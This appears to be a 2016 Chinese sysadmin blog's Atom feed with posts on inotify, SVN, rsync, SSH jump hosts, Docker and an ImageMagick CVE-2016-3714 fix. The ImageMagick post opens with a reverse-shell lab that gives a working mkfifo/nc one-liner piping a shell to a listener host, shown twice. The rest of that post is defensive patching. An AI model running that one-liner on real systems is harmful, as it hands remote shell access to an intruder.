<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[Live with love]]></title>
  <subtitle><![CDATA[Live with love]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://yoursite.com/"/>
  <updated>2016-05-11T07:03:07.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name><![CDATA[践行]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[inotify 监控文件和目录变化]]></title>
    <link href="http://yoursite.com/2016/05/11/inotify-%E7%9B%91%E6%8E%A7%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E5%8F%98%E5%8C%96/"/>
    <id>http://yoursite.com/2016/05/11/inotify-监控文件和目录变化/</id>
    <published>2016-05-11T01:49:32.000Z</published>
    <updated>2016-05-11T07:03:07.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u672C_u6765_u6253_u7B97_u628A_u8981_u76D1_u63A7_u7684_u6587_u4EF6_u653E_mysql_2C__u901A_u8FC7_u76D1_u63A7_mysql__u5B9E_u73B0"><a href="#u672C_u6765_u6253_u7B97_u628A_u8981_u76D1_u63A7_u7684_u6587_u4EF6_u653E_mysql_2C__u901A_u8FC7_u76D1_u63A7_mysql__u5B9E_u73B0" class="headerlink" title="本来打算把要监控的文件放 mysql, 通过监控 mysql 实现"></a>本来打算把要监控的文件放 mysql, 通过监控 mysql 实现</h3><pre><code>广州-kali  17:06:13
mysql 能不能设置这样的功能:  查询某个表的某个字段就触发报警脚本
北京-青山  17:08:22
.mysql_history 
北京-青山  17:08:53
默认你连接mysql后执行的命令这个文件里会有记录，你可以发告警，不过是事后
北京-青山  17:09:19
不过这个是在服务器上操作时的告警
北京-青山  17:09:33
远程odbc连接的话里面没有
北京-青山  17:10:14
binlog日志里应该可以提取出来

广州-小王-Vip  17:19:42
建个触发器可行？select的不知道能否判断，没研究过
北京-青山  17:20:05
select不行，delete\update可以
</code></pre><p>但是网上有的说查看正在写入的 binlog 会有不良后果… , 所以另寻他法, 想起了以前做文件同步时候用的 inotify</p>
<h3 id="u5B89_u88C5_u4F7F_u7528_inotify-tools"><a href="#u5B89_u88C5_u4F7F_u7528_inotify-tools" class="headerlink" title="安装使用 inotify-tools"></a>安装使用 inotify-tools</h3><p>inotify 是用 C 的, 作为一只菜鸟 sa, 我用用封装好的inotify-tools 就够了~</p>
<p>安装</p>
<pre><code>yum -y install inotify-tools
</code></pre><p>看看监控/root  目录的效果, 在一个终端输入如下命令, 另一个终端做测试, 比如cat a.txt:</p>
<pre><code>[root@node1 ~]# inotifywait -mrq --timefmt &apos;%d/%m/%y %H:%M&apos; --format &apos;%T %w%f %e&apos; -e access,move,modify,delete,create,attrib /root
11/05/16 10:54 /root/a.txt ACCESS
</code></pre><p>利用管道就能触发变更操作:</p>
<pre><code>[root@node1 ~]# inotifywait -mrq --timefmt &apos;%d/%m/%y %H:%M&apos; --format &apos;%T %w%f %e&apos; -e access,move,modify,delete,create,attrib /root | while read line; do echo &quot;sb. is doing sth.&quot; ; done
</code></pre><p><a href="https://www.centos.bz/2012/06/inotify-tools-introduction/" target="_blank" rel="external">inotify-tools使用方法介绍</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u672C_u6765_u6253_u7B97_u628A_u8981_u76D1_u63A7_u7684_u6587_u4EF6_u653E_mysql_2C__u901A_u8FC7_u76D1_u63A7_mysql__u5B9E_u73B0"><a hre]]>
    </summary>
    
      <category term="inotify" scheme="http://yoursite.com/tags/inotify/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用 supervisor 管理进程]]></title>
    <link href="http://yoursite.com/2016/05/11/%E4%BD%BF%E7%94%A8-supervisor-%E7%AE%A1%E7%90%86%E8%BF%9B%E7%A8%8B/"/>
    <id>http://yoursite.com/2016/05/11/使用-supervisor-管理进程/</id>
    <published>2016-05-11T01:08:17.000Z</published>
    <updated>2016-05-11T01:09:10.000Z</updated>
    <content type="html"><![CDATA[<p><a href="http://www.cnblogs.com/shanyou/p/5075744.html" target="_blank" rel="external">http://www.cnblogs.com/shanyou/p/5075744.html</a></p>
<p><a href="http://liyangliang.me/posts/2015/06/using-supervisor/" target="_blank" rel="external">http://liyangliang.me/posts/2015/06/using-supervisor/</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><a href="http://www.cnblogs.com/shanyou/p/5075744.html" target="_blank" rel="external">http://www.cnblogs.com/shanyou/p/5075744.html</a><]]>
    </summary>
    
      <category term="supervisor" scheme="http://yoursite.com/tags/supervisor/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[修复ImageMagic漏洞(CVE-2016-3714)]]></title>
    <link href="http://yoursite.com/2016/05/10/%E4%BF%AE%E5%A4%8DImageMagic%E6%BC%8F%E6%B4%9E-CVE-2016-3714/"/>
    <id>http://yoursite.com/2016/05/10/修复ImageMagic漏洞-CVE-2016-3714/</id>
    <published>2016-05-10T10:29:23.000Z</published>
    <updated>2016-05-11T07:03:19.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u53CD_u5F39_Shell__28Reverse_Shell_29__u5B9E_u9A8C"><a href="#u53CD_u5F39_Shell__28Reverse_Shell_29__u5B9E_u9A8C" class="headerlink" title="反弹 Shell (Reverse Shell) 实验"></a>反弹 Shell (Reverse Shell) 实验</h3><p>将node1的 shell 反弹给 node3</p>
<p>node3监听2333端口:</p>
<pre><code>[root@node3 ~]# nc -lvv 2333
Connection from 10.45.207.236 port 2333 [tcp/snapp] accepted
sh-4.1# hostname
hostname
node1
</code></pre><p>node1 nc反弹:</p>
<pre><code>[root@node1 ~]# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc node3_ip 2333 &gt;/tmp/f
rm: cannot remove `/tmp/f&apos;: No such file or directory
</code></pre><a id="more"></a>
<h3 id="u4FEE_u590D_u8FC7_u7A0B_3A"><a href="#u4FEE_u590D_u8FC7_u7A0B_3A" class="headerlink" title="修复过程:"></a>修复过程:</h3><p>先到<a href="https://github.com/ImageTragick/PoCs" target="_blank" rel="external">这里</a>下载检测脚本:</p>
<p>检测脚本的使用方法:</p>
<pre><code>git clone https://github.com/ImageTragick/PoCs.git
cd PoCs
./test.sh
</code></pre><p>开始检测</p>
<pre><code>[root@HD_Server_Config PoCs]# ./test.sh
testing read
UNSAFE

testing delete
UNSAFE

testing http with local port: 18781
SAFE

testing http with nonce: apPod0Vg
SAFE

testing rce1
UNSAFE

testing rce2
SAFE

testing MSL
UNSAFE
</code></pre><p>可以看到, 是 UNSAFE 的</p>
<p>修复方案:</p>
<p>1.在上传图片时需要通过文件内容来判断用户上传的是否为真实图片类型.(这个需要告知开发人员)</p>
<p>2.使用策略配置文件来禁用ImageMagick的有风险的编码器</p>
<p>对于ImageMagick全局策略配置文件在/etc/ImageMagick下对policy.xml最后一行进行增加下列配置:</p>
<pre><code>vi /etc/ImageMagick/policy.xml

&lt;policymap&gt;

  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPHEMERAL&quot; /&gt;

  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;URL&quot; /&gt;

  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;HTTPS&quot; /&gt;

  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MVG&quot; /&gt;

  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MSL&quot; /&gt;

&lt;/policymap&gt;
</code></pre><p>再次运行检测脚本:</p>
<pre><code>[root@HD_Server_Config PoCs]# ./test.sh
testing read
SAFE

testing delete
SAFE

testing http with local port: 47221
SAFE

testing http with nonce: hMtPw5DB
SAFE

testing rce1
SAFE

testing rce2
SAFE

testing MSL
SAFE
</code></pre><p>参考:</p>
<p><a href="https://imagetragick.com/" target="_blank" rel="external">https://imagetragick.com/</a></p>
<p><a href="http://bobao.360.cn/learning/detail/2862.html" target="_blank" rel="external">CVE-2016-3714ImageMagick远程执行漏洞修复建议</a></p>
<p><a href="http://le4f.net/post/post/reverse-shell-during-the-penetration-test" target="_blank" rel="external">渗透测试:反弹与转发小结 - Reverse Shell During the Penetration Test</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u53CD_u5F39_Shell__28Reverse_Shell_29__u5B9E_u9A8C"><a href="#u53CD_u5F39_Shell__28Reverse_Shell_29__u5B9E_u9A8C" class="headerlink" title="反弹 Shell (Reverse Shell) 实验"></a>反弹 Shell (Reverse Shell) 实验</h3><p>将node1的 shell 反弹给 node3</p>
<p>node3监听2333端口:</p>
<pre><code>[root@node3 ~]# nc -lvv 2333
Connection from 10.45.207.236 port 2333 [tcp/snapp] accepted
sh-4.1# hostname
hostname
node1
</code></pre><p>node1 nc反弹:</p>
<pre><code>[root@node1 ~]# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc node3_ip 2333 &gt;/tmp/f
rm: cannot remove `/tmp/f&apos;: No such file or directory
</code></pre>]]>
    
    </summary>
    
      <category term="Reverse Shell" scheme="http://yoursite.com/tags/Reverse-Shell/"/>
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[svn 配置http 服务]]></title>
    <link href="http://yoursite.com/2016/05/06/svn-%E9%85%8D%E7%BD%AEhttp-%E6%9C%8D%E5%8A%A1/"/>
    <id>http://yoursite.com/2016/05/06/svn-配置http-服务/</id>
    <published>2016-05-06T03:07:33.000Z</published>
    <updated>2016-05-09T09:59:32.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u5B89_u88C5_u670D_u52A1"><a href="#u5B89_u88C5_u670D_u52A1" class="headerlink" title="安装服务"></a>安装服务</h3><p>安装http</p>
<pre><code>yum install -y httpd
</code></pre><p>安装 svn</p>
<pre><code>yum install -y subversion
</code></pre><p>安装Apache SVN模块</p>
<pre><code>yum install -y mod_dav_svn
</code></pre><h3 id="u914D_u7F6E"><a href="#u914D_u7F6E" class="headerlink" title="配置"></a>配置</h3><p>然后是把 svn 配置运行起来, 教程网上很多… </p>
<p>再然后.把 svn 整合进 apache 的配置文件</p>
<pre><code>[root@iZ94c5cs7guZ httpd]# cat /etc/httpd/conf.d/subversion.conf
LoadModule dav_svn_module     modules/mod_dav_svn.so
LoadModule authz_svn_module   modules/mod_authz_svn.so

&lt;Location /svn&gt;    #这行是配置访问的 url , 比如 http://a.com/svn/repos
    DAV svn
    SVNParentPath /data/svndata        #这个就是svn的主目录
    AuthType Basic
    AuthName &quot;Authorization SVN: &quot;
    AuthzSVNAccessFile /data/svndata/authz    #这个文件是从某个仓库考过来的, 权限自己根据需求修改
    AuthUserFile /etc/httpd/conf.d/passwdfile   #这个文件是 htpasswd 生成的, 生成的用户名要写进上面的 auth 文件
    Require valid-user
&lt;/Location&gt;
</code></pre><p>修改一些权限:</p>
<pre><code>chown apache:apache -R /data/svndata
chown apache:apache /etc/httpd/conf.d/passwdfile
</code></pre><p>htpasswd 新增用户:</p>
<pre><code>htpasswd  -n username
</code></pre><p>然后可以配置 nginx 反向代理:</p>
<h4 id="u751F_u6210_SSL__u8BC1_u4E66"><a href="#u751F_u6210_SSL__u8BC1_u4E66" class="headerlink" title="生成 SSL 证书"></a>生成 SSL 证书</h4><p>上面的还没有 https 加密</p>
<pre><code># cd /etc/httpd/conf/
# openssl req -new -x509 -keyout server.key -out server.crt -days 365 -nodes  #这个是缩365天之后不能用了嘛, 感觉在挖坑...
</code></pre><h4 id="u6DFB_u52A0_u7528_u6237_u7684_u811A_u672C"><a href="#u6DFB_u52A0_u7528_u6237_u7684_u811A_u672C" class="headerlink" title="添加用户的脚本"></a>添加用户的脚本</h4><pre><code>cat svn_add_http_admin.sh
#!/bin/bash

SVNPATH=/data/svndata/        #svn 主目录
PASSWDFILE=/etc/httpd/conf.d/passwdfile

read -p &quot;input user name: &quot; USER
read -p &quot;input password: &quot; PASSWD

/usr/bin/htpasswd -b $PASSWDFILE $USER $PASSWD
sed  -ri &quot;s@(^admin = .*)@\1\,$USER@&quot; $SVNPATH/authz
</code></pre><p>参考:</p>
<p><a href="http://my.oschina.net/u/206356/blog/287635" target="_blank" rel="external">Centos 下搭建SVN ＋ Apache 服务器</a></p>
<p><a href="http://www.opstool.com/article/282" target="_blank" rel="external">CentOS搭建Nginx+Subversion环境</a></p>
<p><a href="https://wiki.archlinux.org/index.php/Subversion_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87\" target="_blank" rel="external">Subversion (简体中文)</a>)</p>
<p><a href="http://fengchj.com/?p=735" target="_blank" rel="external">Apache核心(Core)指令<location>和<directory>区别</directory></location></a></p>
<p><a href="https://blog.linuxeye.com/333.html" target="_blank" rel="external">Apache htpasswd命令用法详解</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u5B89_u88C5_u670D_u52A1"><a href="#u5B89_u88C5_u670D_u52A1" class="headerlink" title="安装服务"></a>安装服务</h3><p>安装http</p>
<pre><code>yu]]>
    </summary>
    
      <category term="apache" scheme="http://yoursite.com/tags/apache/"/>
    
      <category term="svn" scheme="http://yoursite.com/tags/svn/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[svnhook 同步代码到远端机器]]></title>
    <link href="http://yoursite.com/2016/05/05/svnhook-%E5%90%8C%E6%AD%A5%E4%BB%A3%E7%A0%81%E5%88%B0%E8%BF%9C%E7%AB%AF%E6%9C%BA%E5%99%A8/"/>
    <id>http://yoursite.com/2016/05/05/svnhook-同步代码到远端机器/</id>
    <published>2016-05-05T07:30:03.000Z</published>
    <updated>2016-05-05T07:56:21.000Z</updated>
    <content type="html"><![CDATA[<p>本文仅做记录</p>
<p>post-commit 脚本主要是通过ssh 远程命令来执行自动更新, 需配置 ssh 免密码登陆</p>
<pre><code>/usr/bin/ssh -p22 root@remote_ip &quot;/bin/bash /opt/www/svn_beta_update.sh&quot; 2&gt;&gt;/tmp/svn_error.log
</code></pre><p>远端机器的同步代码脚本:</p>
<pre><code>#!/bin/bash

/usr/bin/svn update /opt/www/dest/ 2&gt;&gt; svn_update_error.log
</code></pre><p>参考:</p>
<p><a href="http://denglz.blog.51cto.com/3617037/1341835" target="_blank" rel="external">SVN 使用 hooks 自动更新代码到远程的web目录下</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>本文仅做记录</p>
<p>post-commit 脚本主要是通过ssh 远程命令来执行自动更新, 需配置 ssh 免密码登陆</p>
<pre><code>/usr/bin/ssh -p22 root@remote_ip &quot;/bin/bash /opt/www/]]>
    </summary>
    
      <category term="svn" scheme="http://yoursite.com/tags/svn/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Centos 7 配置 ftp 服务器]]></title>
    <link href="http://yoursite.com/2016/05/05/Centos-7-%E9%85%8D%E7%BD%AE-ftp-%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://yoursite.com/2016/05/05/Centos-7-配置-ftp-服务器/</id>
    <published>2016-05-05T06:35:05.000Z</published>
    <updated>2016-05-05T06:39:07.000Z</updated>
    <content type="html"><![CDATA[<p>照这个做</p>
<p><a href="https://www.zybuluo.com/hshustc/note/180958" target="_blank" rel="external">CentOS7.0安装配置vsftp</a></p>
<p>参考:</p>
<p><a href="http://www.ha97.com/4113.html" target="_blank" rel="external">Linux下vsftpd基本配置和虚拟用户设置的安全方法</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>照这个做</p>
<p><a href="https://www.zybuluo.com/hshustc/note/180958" target="_blank" rel="external">CentOS7.0安装配置vsftp</a></p>
<p>参考:</p>
<p]]>
    </summary>
    
      <category term="ftp" scheme="http://yoursite.com/tags/ftp/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[配置ssh和ansible通过跳板机直接登录目标机器]]></title>
    <link href="http://yoursite.com/2016/05/03/%E9%85%8D%E7%BD%AEssh%E5%92%8Cansible%E9%80%9A%E8%BF%87%E8%B7%B3%E6%9D%BF%E6%9C%BA%E7%9B%B4%E6%8E%A5%E7%99%BB%E5%BD%95%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8/"/>
    <id>http://yoursite.com/2016/05/03/配置ssh和ansible通过跳板机直接登录目标机器/</id>
    <published>2016-05-03T10:46:51.000Z</published>
    <updated>2016-05-06T01:04:21.000Z</updated>
    <content type="html"><![CDATA[<h3 id="ssh_u914D_u7F6E"><a href="#ssh_u914D_u7F6E" class="headerlink" title="ssh配置"></a>ssh配置</h3><p>有这样的场景, 我们本地的机器 A 需要通过先登录跳板机 B , 然后在 B 上登录目标机器 C, 本文介绍就是通过配置, 实现从 A 直接登录 C .</p>
<p>首先, 将 A 的公钥放到 B , C的 authorized_keys 文件中, 然后确保能从 A免密码登录到 B. 如果看不懂这句, 请先去补习 ssh 通过密钥免密码登录的内容. </p>
<p>在A机的 <code>~/.ssh/config</code> 中配置</p>
<pre><code>host Server_C
user=user_to_C             #这个用户是 B 上登录到 C 的用户
port=22                #这个端口是 B 上登录到 C 的端口
hostname=Server_C_IP
identityfile=~/.ssh/id_rsa          #本地私钥文件
proxycommand ssh user_to_B@Server_B_IP -p 2000 nc %h %p      # 转发命令, 注意是 A 登录到 B 的用户, IP 和端口
forwardagent yes
</code></pre><a id="more"></a>
<p>然后在A上执行 ssh Server_C 就能登录 到 C 了</p>
<h3 id="Ansible__u7684_u914D_u7F6E"><a href="#Ansible__u7684_u914D_u7F6E" class="headerlink" title="Ansible 的配置"></a>Ansible 的配置</h3><p>原来ansible可以直接用.ssh/config 的东西…只要名字对上就行了…</p>
<p>比如 ansible/hosts 里可以这样用 Server_C</p>
<pre><code>[S_C]
Server_C
</code></pre><p>然后 ssh 跳转什么的, 也可以用 ssh 配置里面的了</p>
<p>不过如果跳转后 ,如果登陆目标机器用户不是 root 用户, 执行 sudo 的时候会有问题.</p>
<h3 id="windows__u4E0B_u7528_xshell__u914D_u7F6E_u767B_u9646_u8DF3_u8F6C"><a href="#windows__u4E0B_u7528_xshell__u914D_u7F6E_u767B_u9646_u8DF3_u8F6C" class="headerlink" title="windows 下用 xshell 配置登陆跳转"></a>windows 下用 xshell 配置登陆跳转</h3><p><a href="http://blog.csdn.net/fly542/article/details/7513571" target="_blank" rel="external">xshell 自动登录与自动跳转</a></p>
<p>xshell 实际是配置A登陆到跳板机 B之后自动执行的 登陆到 C 的命令, 区别在于不需要将 A 的公钥放到 C 的authorized_keys中, 而是将 B 登陆 C 用户的公钥放到 C 的 authorized_keys 文件中</p>
<p>参考:</p>
<p><a href="http://mingxinglai.com/cn/2015/07/ssh-proxycommand/" target="_blank" rel="external">SSH穿越跳板机：一条命令跨越跳板机直接登陆远程计算机</a></p>
<p><a href="http://www.cweye.net/2015/07/17/ansible-jumper.html" target="_blank" rel="external">Ansible通过跳板机管理服务器</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="ssh_u914D_u7F6E"><a href="#ssh_u914D_u7F6E" class="headerlink" title="ssh配置"></a>ssh配置</h3><p>有这样的场景, 我们本地的机器 A 需要通过先登录跳板机 B , 然后在 B 上登录目标机器 C, 本文介绍就是通过配置, 实现从 A 直接登录 C .</p>
<p>首先, 将 A 的公钥放到 B , C的 authorized_keys 文件中, 然后确保能从 A免密码登录到 B. 如果看不懂这句, 请先去补习 ssh 通过密钥免密码登录的内容. </p>
<p>在A机的 <code>~/.ssh/config</code> 中配置</p>
<pre><code>host Server_C
user=user_to_C             #这个用户是 B 上登录到 C 的用户
port=22                #这个端口是 B 上登录到 C 的端口
hostname=Server_C_IP
identityfile=~/.ssh/id_rsa          #本地私钥文件
proxycommand ssh user_to_B@Server_B_IP -p 2000 nc %h %p      # 转发命令, 注意是 A 登录到 B 的用户, IP 和端口
forwardagent yes
</code></pre>]]>
    
    </summary>
    
      <category term="ansible" scheme="http://yoursite.com/tags/ansible/"/>
    
      <category term="ssh" scheme="http://yoursite.com/tags/ssh/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Centos7 配置 rsync 同步的一个 shell 脚本]]></title>
    <link href="http://yoursite.com/2016/05/03/Centos7-%E9%85%8D%E7%BD%AE-rsync-%E5%90%8C%E6%AD%A5%E7%9A%84%E4%B8%80%E4%B8%AA-shell-%E8%84%9A%E6%9C%AC/"/>
    <id>http://yoursite.com/2016/05/03/Centos7-配置-rsync-同步的一个-shell-脚本/</id>
    <published>2016-05-03T03:05:54.000Z</published>
    <updated>2016-05-03T08:20:08.000Z</updated>
    <content type="html"><![CDATA[<p>rsync 脚本</p>
<a id="more"></a>
<pre><code>cat /root/shell/set_rsync.sh
#!/bin/bash

# 此脚本用来配置 rsync 服务端

# 定义一些变量

RPATH=/etc/rsyncd.d
CONF=$RPATH/rsyncd.conf
PASSWD_FILE=$RPATH/rsyncd.password
AUTH=$RPATH/rsyncd.secrets

#本机 IP
ADDRESS=192.168.0.2
# 允许访问服务的 IP
ALLOW_IP=192.168.0.3

TAG_NAME=app_upload_files
# 同步目录
RSYNC_DIR=/tmp/app_upload_files
USER=user
PASSWD=&quot;passwd&quot;


# 先创建 rsync 配置存放目录

[ ! -d $RPATH ] &amp;&amp; mkdir $RPATH

# 创建配置文件

[ ! -f $CONF ] &amp;&amp; touch $CONF
[ ! -f $PASSWD_FILE ] &amp;&amp; touch $PASSWD_FILE
[ ! -f $AUTH ] &amp;&amp; touch $AUTH

cat &gt; $CONF &lt;&lt;EOF
#pid文件位置
pid file = /var/run/rsyncd.pid
#监听的端口号
port = 873

#本机ip，请自行修改为自己机器的ip
address = $ADDRESS
#执行账户
uid = nobody
gid = nobody
use chroot = yes
#是否只读
read only = no
#允许访问设置 可以配ip段，也可以多个ip空格间隔，请改为自己允许的ip
#如果客户端不在以下允许列表中，会报 @ERROR: access denied to xxx from unknown 错误
hosts allow= $ALLOW_IP
hosts deny=*
#最大连接数
max connections = 5
motd file = /etc/rsyncd.d/rsyncd.motd
#log文件位置
log file = /var/log/rsync.log
#超时时间
timeout = 300

#配置要同步的目录，可以添加多个
#自定义名称
[$TAG_NAME]
#同步的目录
path = $RSYNC_DIR
#排除的文件
#exclude from = /etc/rsyncd.d/xxx_exclude_list
list=yes
ignore errors
#认证用户名称
auth users = $USER
#用户认证文件，见接下的第2条
secrets file = /etc/rsyncd.d/rsyncd.secrets
EOF

chmod 600 $CONF
mv /etc/rsyncd.conf{,.bak}
ln -s  $CONF  /etc/rsyncd.conf

echo $PASSWD &gt; $PASSWD_FILE
chmod 600 $PASSWD_FILE

echo &quot;$USER:$PASSWD&quot; &gt; $AUTH
chmod 600 $AUTH


# 启动服务
systemctl enable rsyncd.service
systemctl restart rsyncd.service
systemctl status rsyncd.service

# 执行完脚本后, 还需自行配置防火墙端口 873
</code></pre><p>两台机器都执行这个脚本</p>
<p>然后可以用拉的方式同步:</p>
<pre><code>/usr/bin/rsync -avzP --delete user@server1::app_upload_files /tmp/app_upload_files/ --password-file=/etc/rsyncd.d/rsyncd.password
</code></pre><p>如果用推的方式:</p>
<pre><code>/usr/bin/rsync -avzP /tmp/app_upload_files/ user@server1::app_upload_files --password-file=/etc/rsyncd.d/rsyncd.password
</code></pre><p>注意<code>/tmp/app_upload_files/</code> 如果改成<code>/tmp/app_upload_files</code> (末尾少了斜杠) 推送过去目录结构会变成<code>/tmp/app_upload_files/app_upload_files</code>, 如果提示<code>Permission denied</code>, 则推送目标端的 rsync 配置文件需要把 gid,uid 改成 root</p>
<p>结合 inotfy 脚本进行实时同步, 则必须用推的方式, 因为是监控本地变化, 发生变化推送到远端</p>
<p>inotify 脚本:</p>
<pre><code>cat /etc/rsyncd.d/inotify-rsync.sh
#!/bin/bash

# 此脚本用来监控 源目录文件夹的变化, 跟目标机器进行rsync同步

set -e
#源目录
SRC=/tmp/app_upload_files/
#目标服务器ip
TARGET=192.168.0.3
#rsync 用户
USER=hdruser
#rsync tag
TAG=app_upload_files
# 密码文件
PASSWD=/etc/rsyncd.d/rsyncd.password

#modify,delete,create,attrib这些为监听的动作，比如如果不要delete，那么删除的动作就不会触发同步
/bin/inotifywait -mrq --timefmt &apos;%d/%m/%y %H:%M&apos; --format &apos;%T %w%f%e&apos; -e modify,delete,create,attrib $SRC | while read files
do
/usr/bin/rsync -vzrtopgq --delete --progress --password-file=$PASSWD $SRC $USER@$TARGET::$TAG
done

# 运行方式, 给脚本赋予执行权限, 然后用后台的方式运行: nohup /etc/rsyncd.d/inotify-rsync.sh &amp;
# 加到开机启动项: echo &quot;/etc/rsyncd.d/inotify-rsync.sh &amp;&quot; &gt;&gt; /etc/rc.local
</code></pre><p>参考:</p>
<p><a href="http://xxling.com/blog/article/2093.aspx" target="_blank" rel="external">CentOS7通过rsync和inotify进行实时同步</a></p>
<p><a href="https://segmentfault.com/a/1190000002558330" target="_blank" rel="external">关于rsync+inotify-tools实时同步模式</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>rsync 脚本</p>]]>
    
    </summary>
    
      <category term="Centos 7" scheme="http://yoursite.com/tags/Centos-7/"/>
    
      <category term="rsync" scheme="http://yoursite.com/tags/rsync/"/>
    
      <category term="shell" scheme="http://yoursite.com/tags/shell/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[svn 版本控制命令]]></title>
    <link href="http://yoursite.com/2016/04/26/svn-%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E5%91%BD%E4%BB%A4/"/>
    <id>http://yoursite.com/2016/04/26/svn-版本控制命令/</id>
    <published>2016-04-26T10:20:04.000Z</published>
    <updated>2016-04-26T12:19:29.000Z</updated>
    <content type="html"><![CDATA[<h3 id="checkout__u7279_u5B9A_u7248_u672C"><a href="#checkout__u7279_u5B9A_u7248_u672C" class="headerlink" title="checkout 特定版本"></a>checkout 特定版本</h3><pre><code>svn checkout &lt;svn地址&gt; -r  &lt;版本号&gt;
</code></pre><h3 id="u521B_u5EFA_u5206_u652F"><a href="#u521B_u5EFA_u5206_u652F" class="headerlink" title="创建分支"></a>创建分支</h3><pre><code>$ svn copy svn://test.evergrande.cn/test/trunk svn://test.evergrande.cn/test/branches/TRY-something -m &apos;make branches TRY-something&apos;
Committing transaction...
Committed revision 7.
</code></pre><p>必须要有trunk和 branches 目录</p>
<p>参考: </p>
<p><a href="http://blog.163.com/yang_jianli/blog/static/1619900062010101233015365/" target="_blank" rel="external">svn 选择指定版本</a></p>
<p><a href="http://xstarcd.github.io/wiki/sysadmin/svn_branch_tag_command.html" target="_blank" rel="external">svn命令行创建和删除分支和tags</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="checkout__u7279_u5B9A_u7248_u672C"><a href="#checkout__u7279_u5B9A_u7248_u672C" class="headerlink" title="checkout 特定版本"></a>checkou]]>
    </summary>
    
      <category term="svn" scheme="http://yoursite.com/tags/svn/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Docker 部署Gitlab]]></title>
    <link href="http://yoursite.com/2016/04/22/Docker-%E9%83%A8%E7%BD%B2Gitlab/"/>
    <id>http://yoursite.com/2016/04/22/Docker-部署Gitlab/</id>
    <published>2016-04-22T09:38:07.000Z</published>
    <updated>2016-05-11T07:34:57.000Z</updated>
    <content type="html"><![CDATA[<p>环境: 阿里云 centos7镜像, 已经安装了 docker <a href="http://www.a-ho.com/2016/04/22/Centos-7-%E5%AE%89%E8%A3%85Docker/" target="_blank" rel="external">(docker 安装详情)</a></p>
<p>参考:</p>
<p><a href="https://github.com/sameersbn/docker-gitlab#installation" target="_blank" rel="external">sameersbn/gitlab:8.6.6</a></p>
<p><a href="http://www.cnphp6.com/archives/99594" target="_blank" rel="external">使用DOCKER搭建GITLAB实践</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>环境: 阿里云 centos7镜像, 已经安装了 docker <a href="http://www.a-ho.com/2016/04/22/Centos-7-%E5%AE%89%E8%A3%85Docker/" target="_blank" rel="external]]>
    </summary>
    
      <category term="Gitlab" scheme="http://yoursite.com/tags/Gitlab/"/>
    
      <category term="docker" scheme="http://yoursite.com/tags/docker/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Centos 7 安装Docker]]></title>
    <link href="http://yoursite.com/2016/04/22/Centos-7-%E5%AE%89%E8%A3%85Docker/"/>
    <id>http://yoursite.com/2016/04/22/Centos-7-安装Docker/</id>
    <published>2016-04-22T06:31:15.000Z</published>
    <updated>2016-05-11T07:34:37.000Z</updated>
    <content type="html"><![CDATA[<p>环境:阿里云 centos7 镜像</p>
<h3 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="安装"></a>安装</h3><p>1.查看内核版本, 如果内核太旧, 请升级到最新版本</p>
<pre><code># uname -r
3.10.0-327.13.1.el7.x86_64

# yum update -y
</code></pre><p>2.官方脚本安装</p>
<pre><code># curl -fsSL https://get.docker.com/ | sh
+ sh -c &apos;sleep 3; yum -y -q install docker-engine&apos;
warning: /var/cache/yum/x86_64/7/docker-main-repo/packages/docker-engine-selinux-1.11.0-1.el7.centos.noarch.rpm: Header V4 RSA/SHA512 Signature, key ID 2c52609d: NOKEY
